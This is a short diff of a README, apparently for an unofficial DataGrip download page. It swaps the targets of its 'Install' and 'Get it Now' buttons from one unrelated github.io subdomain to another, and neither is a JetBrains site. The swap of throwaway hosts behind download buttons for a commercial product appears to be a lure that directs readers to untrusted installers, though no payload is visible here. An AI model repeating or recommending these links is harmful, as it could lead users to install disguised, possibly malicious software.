@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://six-sevens.github.io/.github/dataGrip)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://stul-stol.github.io/.github/dataGrip)
 
 </div>
 
@@ -81,7 +81,7 @@ DataGrip's intelligent SQL completion reflects JetBrains' core IDE competency ap
 
 <p align="center">
 
-[![Get it Now DataGrip](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://six-sevens.github.io/.github/dataGrip)
+[![Get it Now DataGrip](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://stul-stol.github.io/.github/dataGrip)
 
 </p>
 
